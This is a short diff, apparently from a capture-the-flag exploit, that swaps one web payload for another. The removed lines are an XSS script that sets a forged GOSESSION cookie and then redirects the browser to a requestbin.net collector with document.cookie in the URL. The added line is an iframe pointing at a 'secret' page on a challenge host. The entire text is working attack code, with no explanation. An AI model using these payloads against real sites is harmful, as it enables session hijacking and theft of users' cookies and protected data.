@@ -1,8 +1,1 @@
-<script>
-function setCookie(){
-    var cookieString = "GOSESSION=guest-go1.11.5=";
-    document.cookie = cookieString;
-}
-setCookie()
-window.location="http://requestbin.net/r/1l8lgtq1?cookie="+document.cookie;
-</script>
+<iframe src="http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr/secret"></iframe>
